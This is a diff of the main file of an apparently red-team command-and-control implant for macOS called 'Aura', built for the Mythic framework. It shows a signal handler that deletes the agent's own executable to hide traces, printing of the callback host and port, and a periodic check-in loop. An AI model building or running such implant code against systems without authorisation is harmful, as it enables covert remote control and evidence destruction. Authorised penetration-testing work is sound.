@@ -4,18 +4,21 @@
 #import "C2CheckIn.h"
 #include <signal.h>
 
-// Signal handler function
+/// Handle the case where we need to quickly delete the payload image for OPSEC
 void handleSignal(int signal) {
-    NSLog(@"🔥 Received SIGNAL (Ctrl-C). Quickly remove the payload image!");
+    NSLog(@"🥷 Received SIGNAL (Ctrl-C). Quickly remove the payload image!");
     BOOL deletionSuccess = [SystemInfoHelper deleteExecutable];
     exit(0);
 }
 
+/// Aura agent entry point
 int main(int argc, const char * argv[]) {
     @autoreleasepool {
+        /// Register a few OPSEC signals
         signal(SIGINT, handleSignal);
         signal(SIGHUP, handleSignal);
 
+        /// Print out the stamped C2 configuration data from Mythic
         NSLog(@"C2 Configuration Data:");
         NSLog(@"Callback Host: %@", [HTTPC2Config callbackHost]);
         NSLog(@"Callback Port: %ld", (long)[HTTPC2Config callbackPort]);
@@ -31,5 +34,6 @@ int main(int argc, const char * argv[]) {
             [NSThread sleepForTimeInterval:5.0];
         }
     }
+
     return 0;
 }
